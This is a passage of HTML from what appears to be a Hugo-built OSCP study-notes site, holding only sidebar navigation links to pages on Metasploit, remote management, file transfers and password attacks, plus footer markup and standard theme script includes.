data-nav-url=../../oscp-notes/the-metasploit-framework/index.html><a class=padding href=../../oscp-notes/the-metasploit-framework/index.html>The Metasploit Framework<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/linux-remote-management/index.html><a class=padding href=../../oscp-notes/linux-remote-management/index.html>Linux Remote Management<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/rdp-and-windows-remote-management/index.html><a class=padding href=../../oscp-notes/rdp-and-windows-remote-management/index.html>RDP and winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfers-linux/index.html><a class=padding href=../../oscp-notes/file-transfers-linux/index.html>File transfers Linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/password-attacks/index.html><a class=padding href=../../oscp-notes/password-attacks/index.html>password attacks<i class="fa-fw fas fa-check read-icon"></i></a></li></ul></li></ul></div><div class="R-sidebarmenu R-shortcutmenu-shortcuts"><ul class="space collapsible-menu"></ul></div><div id=R-footer-margin></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-footercontrols"><ul><li class=R-historyclearer><div class="padding menu-control"><i class="fa-fw fas fa-history"></i>
<span>&nbsp;</span><div class=control-style><button>Clear History</button></div><div class=clear></div></div></li></ul></div><div id=R-footer><p>Built with <a href=https://github.com/McShelby/hugo-theme-relearn title=love><i class="fas fa-heart"></i></a> by <a href=https://gohugo.io/>Hugo</a></p></div></div></aside><script src=../../DrakonOps/js/js-yaml/js-yaml.min.js?1762044492 defer></script><script src=../../DrakonOps/js/d3/d3-color.min.js?1762044492 defer></script><script src=../../DrakonOps/js/d3/d3-dispatch.min.js?1762044492 defer></script><script src=../../DrakonOps/js/d3/d3-drag.min.js?1762044492 defer></script><script src=../../DrakonOps/js/d3/d3-ease.min.js?1762044492 defer></script><script src=../../DrakonOps/js/d3/d3-interpolate.min.js?1762044492 defer></script><script src=../../DrakonOps/js/d3/d3-selection.min.js?1762044492 defer></script><script src=../../DrakonOps/js/d3/d3-timer.min.js?1762044492 defer></script><script src=../../DrakonOps/js/d3/d3-transition.min.js?1762044492 defer></script><script src=../../DrakonOps/js/d3/d3-zoom.min.js?1762044492 defer></script><script src=../../DrakonOps/js/mermaid/mermaid.min.js?1762044492 defer></script><script>window.relearn.themeUseMermaid=JSON.parse("{}")</script><script src=../../DrakonOps/js/clipboard/clipboard.min.js?1762044492 defer></script><script src=../../DrakonOps/js/perfect-scrollbar/perfect-scrollbar.min.js?1762044492 defer></script><script src=../../DrakonOps/js/theme.min.js?1762044492 defer></script></body></html>